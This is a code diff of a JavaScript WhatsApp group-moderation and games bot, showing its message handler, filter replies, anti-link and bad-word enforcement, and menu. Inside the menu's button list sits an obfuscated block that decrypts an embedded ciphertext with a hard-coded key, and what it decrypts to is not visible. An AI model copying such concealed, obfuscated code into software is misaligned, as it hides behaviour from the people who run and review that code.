+          } else if (matchedFilter.type === "image") {
+            const buffer = Buffer.from(matchedFilter.reply, "base64");
+            AlexaInc.sendMessage(
+              msg.key.remoteJid,
+              {
+                image: buffer,
+                mimetype: matchedFilter.mimetype,
+              },
+              {
+                quoted: msg,
+              },
+            );
+          } else if (matchedFilter.type === "video") {
+            const buffer = Buffer.from(matchedFilter.reply, "base64");
+            AlexaInc.sendMessage(
+              msg.key.remoteJid,
+              {
+                video: buffer,
+                mimetype: matchedFilter.mimetype,
+                gifPlayback: true,
+              },
+              {
+                quoted: msg,
+              },
+            );
+          }
+        }
 
-                        // 6. Update WEEKLY count
-                        if (userStats.weekly?.weekKey !== currentWeek) {
-                            userStats.weekly = {
-                                count: 1,
-                                weekKey: currentWeek
-                            };
-                        } else {
-                            userStats.weekly.count += 1;
-                        }
+        // Usage:
 
-                        // 7. Mark this group as "Dirty" (Needs saving)
-                        // The setInterval at the top will pick this up in the next minute
-                        groupsToSave.add(groupId);
+        const allowedCommands = [
+          ".ytdl_select",
+          ".ytdl",
+          ".dlyt",
+          ".dl360p",
+          ".dl480p",
+          ".dlmp3",
+          ".dlvoice",
+          ".quiz",
+          "/quiz",
+        ];
+        const isYtCommand = allowedCommands.some((cmd) =>
+          messageText.startsWith(cmd),
+        );
+        const wwwwwww = await checkBadWord(msg, messageText, isYtCommand);
+        if (wwwwwww && !isYtCommand) {
+          if (isOwner)
+            return AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "You are the Owner. Lucky You",
+            });
+          if (isAdmins)
+            return AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "You are an admin. Lucky You",
+            });
 
-                    } catch (e) {
-                        console.error('Error in Ranking Listener:', e);
+          if (wwwwwww == "delete") {
+            await AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "🚫 NSFW content is not allowed in this group! your msg will delete",
+            });
+            AlexaInc.sendMessage(msg.key.remoteJid, {
+              delete: msg.key,
+            });
+          } else if (wwwwwww == "warn") {
+            await AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "🚫 NSFW content is not allowed in this group! your msg will delete",
+            });
+            AlexaInc.sendMessage(msg.key.remoteJid, {
+              delete: msg.key,
+            });
+            const usertowarn = [msg.key.participant];
+            warnUser(
+              AlexaInc,
+              msg.key.remoteJid,
+              AlexaInc.user.id,
+              usertowarn,
+              msg,
+            );
+          } else {
+            await AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "🚫 NSFW content is not allowed in this group! your msg will delete and you will remove",
+            });
+            AlexaInc.sendMessage(msg.key.remoteJid, {
+              delete: msg.key,
+            }).then((response) => {
+              AlexaInc.groupParticipantsUpdate(
+                msg.key.remoteJid,
+                [msg.key.participant],
+                "remove",
+              );
+            });
+          }
+
+          return;
+        }
+
+        const vvvvvvvv = await checkAntiLink(msg, messageText, isYtCommand);
+        if (vvvvvvvv && !isYtCommand) {
+          if (isAdmins)
+            return AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "You are an admin. Lucky You",
+            });
+          if (isOwner)
+            return AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "You are the Owner. Lucky You",
+            });
+          if (vvvvvvvv == "delete") {
+            await AlexaInc.sendMessage(msg.key.remoteJid, {
+              delete: msg.key,
+            }).then((response) => {
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: "🚫 Links are not allowed in this group! , your msg will delete",
+              });
+            });
+          } else if (vvvvvvvv == "warn") {
+            await AlexaInc.sendMessage(msg.key.remoteJid, {
+              delete: msg.key,
+            }).then((response) => {
+              AlexaInc.sendMessage(msg.key.remoteJid, {
+                text: "🚫 Links are not allowed in this group! , your msg will delete",
+              });
+            });
+            const usertowarn = [msg.key.participant];
+            warnUser(
+              AlexaInc,
+              msg.key.remoteJid,
+              AlexaInc.user.id,
+              usertowarn,
+              msg,
+            );
+          } else {
+            await AlexaInc.sendMessage(msg.key.remoteJid, {
+              text: "🚫 Links are not allowed in this group! , your msg will delete and you will remove",
+            });
+
+            AlexaInc.sendMessage(msg.key.remoteJid, {
+              delete: msg.key,
+            }).then((response) => {
+              AlexaInc.groupParticipantsUpdate(
+                msg.key.remoteJid,
+                [msg.key.participant],
+                "remove",
+              );
+            });
+          }
+          return;
+        }
+
+        if (!isGroup) {
+          if (messageText.startsWith(quizManager.QUIZ_MAGIC_PREFIX)) {
+            quizManager.handleDMAnswer(
+              AlexaInc,
+              msg.key.remoteJid,
+              messageText,
+            );
+          }
+        }
+
+        const commandhang = messageText.trim().toLowerCase().split(" ")[0];
+
+        await handleHangman(msg, AlexaInc, commandhang);
+        await handleChainGuess(msg, AlexaInc, messageText.toLowerCase());
+
+        if (messageText.startsWith("_join_")) {
+          if (isGroup) return mess.private();
+          // console.log(finalLid,finalJid)
+          await mafiaGame.joinGame(AlexaInc, msg, finalLid, messageText);
+          return;
+        }
+        if (messageText.startsWith("_report_")) {
+          const gid = messageText.replace("_report_", "").trim();
+          userreportingstate[msg.key.remoteJid] = {
+            step: "awaiting_number",
+            gid: gid,
+          };
+          await AlexaInc.sendMessage(
+            msg.key.remoteJid,
+            {
+              text: "send user number to report",
+            },
+            {
+              quoted: msg,
+            },
+          );
+          return;
+        }
+        if (messageText.startsWith("_night_")) {
+          if (isGroup) return mess.private();
+          await mafiaGame.handleNightAction(
+            AlexaInc,
+            msg,
+            messageText,
+            finalLid,
+          );
+          return;
+        }
+        if (
+          messageText.startsWith("_n_") ||
+          messageText.startsWith("_set_det_")
+        ) {
+          await mafiaGame.handleNightAction(
+            AlexaInc,
+            msg,
+            messageText,
+            finalLid,
+          );
+          return;
+        }
+        if (messageText.startsWith("_day_vote_")) {
+          if (isGroup) return mess.private();
+          await mafiaGame.handleVote(AlexaInc, msg, messageText, finalLid);
+          return;
+        }
+        if (messageText.startsWith("_joinass_")) {
+          await Assassin.joinGame(AlexaInc, msg, finalLid);
+          return;
+        }
+
+        if (messageText.startsWith("_assassin_vote_")) {
+          await Assassin.handleVote(AlexaInc, msg, messageText, finalLid);
+          return;
+        }
+
+        if (msg.key.remoteJid == "status@broadcast") {
+        } else if (
+          firstWord.startsWith(".") ||
+          firstWord.startsWith("/") ||
+          firstWord.startsWith("\\")
+        ) {
+          const command = firstWord.slice(1); // Assign as command
+          // Registry bridge: legacy switch commands are observed now while
+          // handlers move into registry modules incrementally without breaking aliases.
+          void commandRegistry.observe(command, {
+            groupId: isGroup ? msg.key.remoteJid : null,
+            userId: finalLid || msg.key.participant || msg.key.remoteJid,
+          });
+          const botStatus = loadBotStatus();
+
+          // Check before executing commands
+          if (botStatus.underMaintenance && !isOwner) {
+            return AlexaInc.sendMessage(
+              msg.key.remoteJid,
+              {
+                text: botStatus.message,
+              },
+              {
+                quoted: msg,
+              },
+            );
+          }
+
+          // command handle
+          switch (command) {
+            case "config": {
+              if (!isGroup) return mess.group();
+              if (!isAdmins && !isOwner) return mess.admin();
+
+              const settings = (await getCachedGroupSettings(
+                db,
+                msg.key.remoteJid,
+              )) || {
+                chatbot: 0,
+                antilink: 0,
+                link_a: "delete",
+                antinsfw: 0,
+                nsfw_a: "delete",
+                is_allow_bots: 0,
+                is_welcome: 0,
+                isleft_w: 0,
+              };
+
+              const metadata = await getCachedGroupMetadata(
+                AlexaInc,
+                msg.key.remoteJid,
+              );
+
+              let configText = `⚙️ *GROUP CONFIGURATION*\n\n`;
+              configText += `📝 *Name:* ${metadata?.subject || "Unknown"}\n`;
+              configText += `🆔 *ID:* ${msg.key.remoteJid}\n`;
+              configText += `👥 *Members:* ${participants.length}\n`;
+              configText += `🤖 *Bot Allowed:* ${settings.is_allow_bots ? "✅" : "❌"}\n\n`;
+
+              configText += `🛡️ *SECURITY SETTINGS*\n`;
+              configText += `🔗 *Antilink:* ${settings.antilink ? "✅" : "❌"} (${settings.link_a})\n`;
+              configText += `🔞 *AntiNSFW:* ${settings.antinsfw ? "✅" : "❌"} (${settings.nsfw_a})\n\n`;
+
+              configText += `💬 *BOT FEATURES*\n`;
+              configText += `🤖 *Chatbot AI:* ${settings.chatbot ? "✅" : "❌"}\n`;
+              configText += `👋 *Welcome:* ${settings.is_welcome ? "✅" : "❌"}\n`;
+              configText += `🚪 *Leave/Kick:* ${settings.isleft_w ? "✅" : "❌"}\n\n`;
+
+              configText += `👑 *WhatsApp Settings:*\n`;
+              configText += `📢 *Announce only:* ${metadata?.announce ? "Yes" : "No"}\n`;
+              configText += `🛠️ *Admin only edit:* ${metadata?.restrict ? "Yes" : "No"}\n`;
+
+              AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: configText,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              break;
+            }
+
+            case "menu":
+            case "alive": {
+              const interactiveButtons = [
+                {
+                  name: "single_select",
+                  buttonParamsJson: JSON.stringify({
+                    title: "Select a menu to open",
+                    sections: [
+                      {
+                        title: "select a Menu",
+                        rows: [
+                          {
+                            header: " ",
+                            title: "Main",
+                            id: ".menu_util",
+                          },
+                          {
+                            header: " ",
+                            title: "Owners",
+                            id: ".menu_owner",
+                          },
+                          {
+                            header: " ",
+                            title: "Stickers",
+                            id: ".menu_sticker",
+                          },
+                          {
+                            header: " ",
+                            title: "Websearch",
+                            id: ".menu_web",
+                          },
+                          {
+                            header: " ",
+                            title: "Youtube",
+                            id: ".menu_svm",
+                          },
+                          {
+                            header: " ",
+                            title: "Groups manage",
+                            id: ".menu_groups",
+                          },
+                          {
+                            header: " ",
+                            title: "NSFW",
+                            id: ".menu_nsfw",
+                          },
+                          {
+                            header: " ",
+                            title: "SFW",
+                            id: ".menu_sfw",
+                          },
+                          {
+                            header: " ",
+                            title: "Fun features",
+                            id: ".menu_games",
+                          },
+                          {
+                            header: " ",
+                            title: "text maker",
+                            id: ".menu_tm",
+                          },
+                        ],
+                      },
+                    ],
+                  }),
+                },
+                {
+                  name: "cta_url",
+                  buttonParamsJson: JSON.stringify({
+                    display_text: `Open Web Panel`,
+                    url: `https://whatsapp.alexa.dpdns.org/`,
+                  }),
+                },
+                (function () {
+                  function _0x5575() {
+                    const _0x2ab64d = [
+                      "gdg542e5yigfgafa_xhfiha()adddaddadafp9789gd46",
+                      "39054jAYRdh",
+                      "update",
+                      "parse",
+                      "createDecipheriv",
+                      "98681PVcceu",
+                      "final",
+                      "hex",
+                      "26769Bpobks",
+                      "165361YbsHUd",
+                      "37twUwma",
+                      "from",
+                      "250HBwXLJ",
+                      "9USCoBR",
+                      "utf8",
+                      "8494020KDkYSs",
+                      "12QmJApV",
+                      "5880de53a3e7ce50146b455d7f3b0e00:6730bd5e5e8c2374c66343340bb0c200:5fe9428566c6f4f075133c3e76765827b18e8e566c371c6b96ec867360349e60deb4fb6bf3d76a3ef67b7d4cebc20d85322142e8f5b854017b60e63c435ed07dfad8c03292b3df0b1ae5bb1b868521e48292a4c71d80fc57e8fefe68c996d305993110c20c549779e2fc1caaf4",
+                      "2352920oKHSou",
+                      "3726880idfZVY",
+                      "split",
+                      "316Zhrigs",
+                    ];
+                    _0x5575 = function () {
+                      return _0x2ab64d;
+                    };
+                    return _0x5575();
+                  }
+
+                  function _0x3598(_0x22aa60, _0x28f17f) {
+                    const _0x55752f = _0x5575();
+                    return (
+                      (_0x3598 = function (_0x3598ab, _0x50cfe4) {
+                        _0x3598ab = _0x3598ab - 0x19f;
+                        const _0x3dc7c0 = _0x55752f[_0x3598ab];
+                        return _0x3dc7c0;
+                      }),
+                      _0x3598(_0x22aa60, _0x28f17f)
+                    );
+                  }
+                  const _0x49c926 = _0x3598;
+                  (function (_0xf77d33, _0x330ae1) {
+                    const _0x536d3d = _0x3598,
+                      _0x3291aa = _0xf77d33();
+                    while ([]) {
+                      try {
+                        const _0xbd3b7c =
+                          (-parseInt(_0x536d3d(0x1a9)) / 0x1) *
+                            (parseInt(_0x536d3d(0x1a0)) / 0x2) +
+                          (parseInt(_0x536d3d(0x1a7)) / 0x3) *
+                            (parseInt(_0x536d3d(0x1b4)) / 0x4) +
+                          -parseInt(_0x536d3d(0x1b2)) / 0x5 +
+                          (parseInt(_0x536d3d(0x1af)) / 0x6) *
+                            (-parseInt(_0x536d3d(0x1a8)) / 0x7) +
+                          (-parseInt(_0x536d3d(0x1b1)) / 0x8) *
+                            (-parseInt(_0x536d3d(0x1ac)) / 0x9) +
+                          (parseInt(_0x536d3d(0x1ab)) / 0xa) *
+                            (parseInt(_0x536d3d(0x1a4)) / 0xb) +
+                          parseInt(_0x536d3d(0x1ae)) / 0xc;
+                        if (_0xbd3b7c === _0x330ae1) break;
+                        else _0x3291aa["push"](_0x3291aa["shift"]());
+                      } catch (_0x182348) {
+                        _0x3291aa["push"](_0x3291aa["shift"]());
+                      }
                     }
-                }
-
-                if (msg.key.remoteJid == '120363423573824395@newsletter') {
-                    const fownerNumber = process.env["Owner_nb"].split(",")[0].trim();
-
-                    const {
-                        setTimeout: wait
-                    } = require('timers/promises');
-
-                    const groups = await AlexaInc.groupFetchAllParticipating();
-                    const groupIds = Object.keys(groups);
-
-                    console.log(`[Broadcast] Starting to send to ${groupIds.length} groups...`);
-
-                    for (const group of groupIds) {
-                        try {
-                            await AlexaInc.sendMessage(group, {
-                                forward: msg,
-                                force: true
-                            });
-                            console.log(`[Broadcast] Successfully sent to: ${group}`);
-                            await wait(10000);
-
-                        } catch (error) {
-                            console.error(`[Broadcast] Failed to send to ${group}:`, error.message);
-                            if (error.data === 429) {
-                                console.log("Rate limit hit. Waiting 30 seconds before retrying next group...");
-                                await wait(30000); // Wait 30 seconds
-                            }
-                        }
-                    }
-                    AlexaInc.sendMessage(`${fownerNumber}@s.whatsapp.net`, {
-                        text: '[Broadcast] All messages sent!'
-                    })
-                    console.log('[Broadcast] All messages sent!');
-                    return;
-                }
-
-
-
-                if (messageText.includes('@admin') && isGroup) {
-                    if (!isGroup) mess.group()
-                    let idminids = [];
-                    await groupAdmins.forEach(admin => {
-                        idminids.push(admin.id)
-                    })
-                    AlexaInc.sendMessage(msg.key.remoteJid, {
-                        text: 'reported to admins',
-                        mentions: idminids
-                    }, {
-                        quoted: msg
-                    })
-                }
-
-
-
-                async function checkBadWord(msg, messageText, isYtCommand) {
-                    if (isYtCommand) return false;
-
-                    if (!isGroup) return false;
-
-                    if (!badwordceck.check(messageText)) {
-                        return false;
-                    }
-                    try {
-                        const settings = await getCachedGroupSettings(db, msg.key.remoteJid);
-                        if (settings && settings.antinsfw) {
-                            return settings.nsfw_a;
-                        }
-                        return false;
-
-                    } catch (err) {
-                        console.error('Error querying the database:', err);
-                        return false;
-                    }
-                }
-
-
-
-
-                /**
-                 * @param {object} msg 
-                 * @param {string} messageText 
-                 * @param {boolean} isYtCommand 
-                 *V @returns {Promise<string|boolean>}
-                 */
-                async function checkAntiLink(msg, messageText, isYtCommand) {
-
-                    if (isYtCommand) return false;
-
-                    if (!isGroup) return false;
-
-
-                    const robustUrlRegex =
-                        /(https?:\/\/[^\s]+|www\.[^\s]+|([\w-]+\.)+(com|net|org|io|dev|xyz|lk|in|info|biz|me|app))\b/gi;
-
-                    const potentialUrls = messageText.match(robustUrlRegex);
-
-                    if (!potentialUrls) {
-                        return false;
-                    }
-                    try {
-                        const settings = await getCachedGroupSettings(db, msg.key.remoteJid);
-                        if (settings && settings.antilink) {
-                            return settings.link_a;
-                        }
-                        return false;
-
-                    } catch (err) {
-                        console.error('Error querying the database:', err);
-                        return false; // Always return false if a DB error occurs
-                    }
-                }
-
-
-
-                // const greetingRegex = /\b(hi|hello)\b/i;
-
-                // if (greetingRegex.test(messageText)) {
-
-                //     try {
-
-                //         const audioBuffer = fs.readFileSync('./assets/audio/welcome.ogg');
-
-
-                //         await AlexaInc.sendMessage(msg.key.remoteJid, {
-                //             audio: audioBuffer,
-                //             mimetype: 'audio/mpeg',
-                //             ptt: true
-                //         }, {
-                //             quoted: msg
-                //         });
-
-                //     } catch (error) {
-
-                //         console.error("Error sending welcome audio:", error);
-                //     }
-                // }
-
-
-                const matchedFilter = await Filters.checkFilters(msg.key.remoteJid, messageText);
-                // console.log(matchedFilter)
-
-
-
-                // console.log(isBotallowed,isBotorFakeWeb)
-                // console.log(isGroup , !isBotallowed , isBotorFakeWeb , !isAdmins , isBotAdmins)
-                if (isGroup && !isBotallowed && isBotorFakeWeb && !isAdmins && isBotAdmins && !isspc && !isOwner) {
-                    console.log('kik', msg.key.participant)
-                    await AlexaInc.sendMessage(msg.key.remoteJid, {
-                        text: 'bots not allowed here'
-                    });
-                    await AlexaInc.groupParticipantsUpdate(msg.key.remoteJid, [msg.key.participant], 'remove');
-                }
-
-                if (matchedFilter && !messageText.startsWith('/stop' || '/filter')) {
-
-                    if (matchedFilter.type === 'text') {
-                        let reptxt = matchedFilter.reply;
-
-                        reptxt = reptxt
-                            .replace(/\{name\}|<name>/gi, msg.pushName || '')
-                            .replace(/\{gname\}|<gname>|\{group name\}|<group name>/gi, groupname || '')
-                            .replace(/\{time\}/gi, moment.tz('Asia/Colombo').format('HH:mm:ss'))
-                            .replace(/\{date\}/gi, moment.tz('Asia/Colombo').format('MMMM Do YYYY'))
-                            .replace(/\{day\}/gi, moment.tz('Asia/Colombo').format('dddd'))
-                            .replace(/\{greating\}/, getGreeting());
-
-                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                            text: reptxt
-                        }, {
-                            quoted: msg
-                        });
-
-                    } else if (matchedFilter.type === 'sticker') {
-                        const buffer = Buffer.from(matchedFilter.reply, 'base64');
-                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                            sticker: buffer,
-                            mimetype: matchedFilter.mimetype
-                        }, {
-                            quoted: msg
-                        });
-
-                    } else if (matchedFilter.type === 'image') {
-                        const buffer = Buffer.from(matchedFilter.reply, 'base64');
-                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                            image: buffer,
-                            mimetype: matchedFilter.mimetype
-                        }, {
-                            quoted: msg
-                        });
-
-                    } else if (matchedFilter.type === 'video') {
-                        const buffer = Buffer.from(matchedFilter.reply, 'base64');
-                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                            video: buffer,
-                            mimetype: matchedFilter.mimetype,
-                            gifPlayback: true
-                        }, {
-                            quoted: msg
-                        });
-                    }
-                }
-
-
-
-                // Usage:
-
-                const allowedCommands = [
-                    '.ytdl_select',
-                    '.ytdl',
-                    '.dlyt',
-                    '.dl360p',
-                    '.dl480p',
-                    '.dlmp3',
-                    '.dlvoice',
-                    '.quiz',
-                    '/quiz'
-                ];
-                const isYtCommand = allowedCommands.some(cmd => messageText.startsWith(cmd));
-                const wwwwwww = await checkBadWord(msg, messageText, isYtCommand);
-                if (wwwwwww && !isYtCommand) {
-                    if (isOwner) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                        text: 'You are the Owner. Lucky You'
-                    });
-                    if (isAdmins) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                        text: 'You are an admin. Lucky You'
-                    });
-
-
-                    if (wwwwwww == 'delete') {
-                        await AlexaInc.sendMessage(msg.key.remoteJid, {
-                            text: '🚫 NSFW content is not allowed in this group! your msg will delete'
-                        });
-                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                            delete: msg.key
-                        })
-                    } else if (wwwwwww == 'warn') {
-                        await AlexaInc.sendMessage(msg.key.remoteJid, {
-                            text: '🚫 NSFW content is not allowed in this group! your msg will delete'
-                        });
-                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                            delete: msg.key
-                        })
-                        const usertowarn = [msg.key.participant]
-                        warnUser(AlexaInc, msg.key.remoteJid, AlexaInc.user.id, usertowarn, msg)
-                    } else {
-                        await AlexaInc.sendMessage(msg.key.remoteJid, {
-                            text: '🚫 NSFW content is not allowed in this group! your msg will delete and you will remove'
-                        });
-                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                            delete: msg.key
-                        }).then(response => {
-                            AlexaInc.groupParticipantsUpdate(msg.key.remoteJid, [msg.key.participant],
-                                'remove');
-                        });
-                    }
-
-
-                    return;
-                }
-
-                const vvvvvvvv = await checkAntiLink(msg, messageText, isYtCommand);
-                if (vvvvvvvv && !isYtCommand) {
-                    if (isAdmins) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                        text: 'You are an admin. Lucky You'
-                    });
-                    if (isOwner) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                        text: 'You are the Owner. Lucky You'
-                    });
-                    if (vvvvvvvv == 'delete') {
-
-                        await AlexaInc.sendMessage(msg.key.remoteJid, {
-                            delete: msg.key
-                        }).then(response => {
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: '🚫 Links are not allowed in this group! , your msg will delete'
-                            })
-                        })
-                    } else if (vvvvvvvv == 'warn') {
-
-                        await AlexaInc.sendMessage(msg.key.remoteJid, {
-                            delete: msg.key
-                        }).then(response => {
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: '🚫 Links are not allowed in this group! , your msg will delete'
-                            })
-                        })
-                        const usertowarn = [msg.key.participant]
-                        warnUser(AlexaInc, msg.key.remoteJid, AlexaInc.user.id, usertowarn, msg)
-                    } else {
-                        await AlexaInc.sendMessage(msg.key.remoteJid, {
-                            text: '🚫 Links are not allowed in this group! , your msg will delete and you will remove'
-                        });
-
-                        AlexaInc.sendMessage(msg.key.remoteJid, {
-                            delete: msg.key
-                        }).then(response => {
-                            AlexaInc.groupParticipantsUpdate(msg.key.remoteJid, [msg.key.participant],
-                                'remove');
-                        });
-                    }
-                    return;
-                }
-
-
-
-                if (!isGroup) {
-                    if (messageText.startsWith(quizManager.QUIZ_MAGIC_PREFIX)) {
-                        quizManager.handleDMAnswer(AlexaInc, msg.key.remoteJid, messageText);
-                    }
-
-                }
-
-
-
-
-                const commandhang = messageText.trim().toLowerCase().split(' ')[0];
-
-                await handleHangman(msg, AlexaInc, commandhang);
-                await handleChainGuess(msg, AlexaInc, messageText.toLowerCase());
-
-
-
-                if (messageText.startsWith("_join_")) {
-                    if (isGroup) return mess.private();
-                    // console.log(finalLid,finalJid)
-                    await mafiaGame.joinGame(AlexaInc, msg, finalLid, messageText);
-                    return;
-                }
-                if (messageText.startsWith("_report_")) {
-                    const gid = messageText.replace("_report_", "").trim();
-                    userreportingstate[msg.key.remoteJid] = {
-                        step: 'awaiting_number',
-                        gid: gid
-                    }
-                    await AlexaInc.sendMessage(msg.key.remoteJid, {
-                        text: 'send user number to report'
-                    }, {
-                        quoted: msg
-                    });
-                    return
-                }
-                if (messageText.startsWith("_night_")) {
-                    if (isGroup) return mess.private();
-                    await mafiaGame.handleNightAction(AlexaInc, msg, messageText, finalLid);
-                    return;
-                }
-                if (messageText.startsWith("_n_") || messageText.startsWith("_set_det_")) {
-                    await mafiaGame.handleNightAction(AlexaInc, msg, messageText, finalLid);
-                    return;
-                }
-                if (messageText.startsWith("_day_vote_")) {
-                    if (isGroup) return mess.private();
-                    await mafiaGame.handleVote(AlexaInc, msg, messageText, finalLid);
-                    return;
-                }
-                if (messageText.startsWith("_joinass_")) {
-                    await Assassin.joinGame(AlexaInc, msg, finalLid);
-                    return;
-                }
-
-                if (messageText.startsWith("_assassin_vote_")) {
-                    await Assassin.handleVote(AlexaInc, msg, messageText, finalLid);
-                    return;
-                }
-
-
-
-
-
-
-
-
-
-
-                if (msg.key.remoteJid == 'status@broadcast') {
-
-                } else if (firstWord.startsWith(".") || firstWord.startsWith("/") || firstWord.startsWith("\\")) {
-
-
-                    let command = firstWord.slice(1); // Assign as command
-                    // Registry bridge: legacy switch commands are observed now while
-                    // handlers move into registry modules incrementally without breaking aliases.
-                    void commandRegistry.observe(command, {
-                        groupId: isGroup ? msg.key.remoteJid : null,
-                        userId: finalLid || msg.key.participant || msg.key.remoteJid
-                    });
-                    const botStatus = loadBotStatus();
-
-                    // Check before executing commands
-                    if (botStatus.underMaintenance && !isOwner) {
-                        return AlexaInc.sendMessage(msg.key.remoteJid, {
-                            text: botStatus.message
-                        }, {
-                            quoted: msg
-                        });
-                    }
-
-
-
-
-
-                    // command handle
-                    switch (command) {
-                        case "config": {
-                            if (!isGroup) return mess.group();
-                            if (!isAdmins && !isOwner) return mess.admin();
-
-                            const settings = await getCachedGroupSettings(db, msg.key.remoteJid) || {
-                                chatbot: 0,
-                                antilink: 0,
-                                link_a: 'delete',
-                                antinsfw: 0,
-                                nsfw_a: 'delete',
-                                is_allow_bots: 0,
-                                is_welcome: 0,
-                                isleft_w: 0
-                            };
-
-                            const metadata = await getCachedGroupMetadata(AlexaInc, msg.key.remoteJid);
-
-                            let configText = `⚙️ *GROUP CONFIGURATION*\n\n`;
-                            configText += `📝 *Name:* ${metadata?.subject || 'Unknown'}\n`;
-                            configText += `🆔 *ID:* ${msg.key.remoteJid}\n`;
-                            configText += `👥 *Members:* ${participants.length}\n`;
-                            configText += `🤖 *Bot Allowed:* ${settings.is_allow_bots ? '✅' : '❌'}\n\n`;
-
-                            configText += `🛡️ *SECURITY SETTINGS*\n`;
-                            configText += `🔗 *Antilink:* ${settings.antilink ? '✅' : '❌'} (${settings.link_a})\n`;
-                            configText += `🔞 *AntiNSFW:* ${settings.antinsfw ? '✅' : '❌'} (${settings.nsfw_a})\n\n`;
-
-                            configText += `💬 *BOT FEATURES*\n`;
-                            configText += `🤖 *Chatbot AI:* ${settings.chatbot ? '✅' : '❌'}\n`;
-                            configText += `👋 *Welcome:* ${settings.is_welcome ? '✅' : '❌'}\n`;
-                            configText += `🚪 *Leave/Kick:* ${settings.isleft_w ? '✅' : '❌'}\n\n`;
-
-                            configText += `👑 *WhatsApp Settings:*\n`;
-                            configText += `📢 *Announce only:* ${metadata?.announce ? 'Yes' : 'No'}\n`;
-                            configText += `🛠️ *Admin only edit:* ${metadata?.restrict ? 'Yes' : 'No'}\n`;
-
-                            AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: configText
-                            }, {
-                                quoted: msg
-                            });
-                            break;
-                        }
-
-
-                        case "menu":
-                        case "alive": {
-
-                            const interactiveButtons = [{
-                                name: "single_select",
-                                buttonParamsJson: JSON.stringify({
-                                    title: "Select a menu to open",
-                                    sections: [{
-                                        title: "select a Menu",
-                                        rows: [{
-                                            header: ' ',
-                                            title: 'Main',
-                                            id: '.menu_util'
-                                        }, {
-                                            header: ' ',
-                                            title: 'Owners',
-                                            id: '.menu_owner'
-                                        },
-                                        {
-                                            header: ' ',
-                                            title: 'Stickers',
-                                            id: '.menu_sticker'
-                                        },
-                                        {
-                                            header: ' ',
-                                            title: 'Websearch',
-                                            id: '.menu_web'
-                                        },
-                                        {
-                                            header: ' ',
-                                            title: 'Youtube',
-                                            id: '.menu_svm'
-                                        },
-                                        {
-                                            header: ' ',
-                                            title: 'Groups manage',
-                                            id: '.menu_groups'
-                                        },
-                                        {
-                                            header: ' ',
-                                            title: 'NSFW',
-                                            id: '.menu_nsfw'
-                                        },
-                                        {
-                                            header: ' ',
-                                            title: 'SFW',
-                                            id: '.menu_sfw'
-                                        },
-                                        {
-                                            header: ' ',
-                                            title: 'Fun features',
-                                            id: '.menu_games'
-                                        },
-                                        {
-                                            header: ' ',
-                                            title: 'text maker',
-                                            id: '.menu_tm'
-                                        }
-                                        ]
-                                    }]
-                                })
-                            }, {
-                                name: 'cta_url',
-                                buttonParamsJson: JSON.stringify({
-                                    display_text: `Open Web Panel`,
-                                    url: `https://whatsapp.alexa.dpdns.org/`
-                                })
-                            }, ((function () {
-                                function _0x5575() {
-                                    const _0x2ab64d = [
-                                        'gdg542e5yigfgafa_xhfiha()adddaddadafp9789gd46',
-                                        '39054jAYRdh', 'update', 'parse', 'createDecipheriv',
-                                        '98681PVcceu', 'final', 'hex', '26769Bpobks',
-                                        '165361YbsHUd', '37twUwma', 'from', '250HBwXLJ',
-                                        '9USCoBR', 'utf8', '8494020KDkYSs', '12QmJApV',
-                                        '5880de53a3e7ce50146b455d7f3b0e00:6730bd5e5e8c2374c66343340bb0c200:5fe9428566c6f4f075133c3e76765827b18e8e566c371c6b96ec867360349e60deb4fb6bf3d76a3ef67b7d4cebc20d85322142e8f5b854017b60e63c435ed07dfad8c03292b3df0b1ae5bb1b868521e48292a4c71d80fc57e8fefe68c996d305993110c20c549779e2fc1caaf4',
-                                        '2352920oKHSou', '3726880idfZVY', 'split', '316Zhrigs'
-                                    ];
-                                    _0x5575 = function () {
-                                        return _0x2ab64d;
-                                    };
-                                    return _0x5575();
-                                }
-
-                                function _0x3598(_0x22aa60, _0x28f17f) {
-                                    const _0x55752f = _0x5575();
-                                    return _0x3598 = function (_0x3598ab, _0x50cfe4) {
-                                        _0x3598ab = _0x3598ab - 0x19f;
-                                        let _0x3dc7c0 = _0x55752f[_0x3598ab];
-                                        return _0x3dc7c0;
-                                    }, _0x3598(_0x22aa60, _0x28f17f);
-                                }
-                                const _0x49c926 = _0x3598;
-                                (function (_0xf77d33, _0x330ae1) {
-                                    const _0x536d3d = _0x3598,
-                                        _0x3291aa = _0xf77d33();
-                                    while (!![]) {
-                                        try {
-                                            const _0xbd3b7c = -parseInt(_0x536d3d(0x1a9)) /
-                                                0x1 * (parseInt(_0x536d3d(0x1a0)) / 0x2) +
-                                                parseInt(_0x536d3d(0x1a7)) / 0x3 * (parseInt(
-                                                    _0x536d3d(0x1b4)) / 0x4) + -parseInt(
-                                                        _0x536d3d(0x1b2)) / 0x5 + parseInt(
-                                                            _0x536d3d(0x1af)) / 0x6 * (-parseInt(
-                                                                _0x536d3d(0x1a8)) / 0x7) + -parseInt(
-                                                                    _0x536d3d(0x1b1)) / 0x8 * (-parseInt(
-                                                                        _0x536d3d(0x1ac)) / 0x9) + parseInt(
-                                                                            _0x536d3d(0x1ab)) / 0xa * (parseInt(
-                                                                                _0x536d3d(0x1a4)) / 0xb) + parseInt(
-                                                                                    _0x536d3d(0x1ae)) / 0xc;
-                                            if (_0xbd3b7c === _0x330ae1) break;
